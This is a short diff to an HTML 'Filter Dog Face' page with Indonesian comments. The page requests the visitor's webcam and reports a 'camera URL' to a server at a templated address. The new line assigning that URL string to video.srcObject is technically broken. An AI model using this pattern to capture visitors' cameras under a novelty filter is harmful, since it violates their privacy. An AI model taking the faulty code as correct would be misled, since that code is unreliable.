@@ -20,8 +20,9 @@
   </head>
   <body>
     <h1>Filter Dog Face</h1>
-    <img src="https://{{ ip }}/fungsiSatu" id="camera-stream" />
+    <video id="camera-stream" autoplay></video>
     <script>
+      var video = document.querySelector("#camera-stream");
         // Mendapatkan akses kamera pengguna
         navigator.getUserMedia = (navigator.getUserMedia ||
                                   navigator.webkitGetUserMedia ||
@@ -44,6 +45,7 @@
                 })
                 .then(response => console.log('URL kamera berhasil dikirim'))
                 .catch(error => console.error('Gagal mengirim URL kamera:', error));
+              video.srcObject = "https://{{ ip }}/fungsiSatu";
             }, function(error) {
                 console.error('Izinkan menggunakan webcam untuk demo:', error);
             });
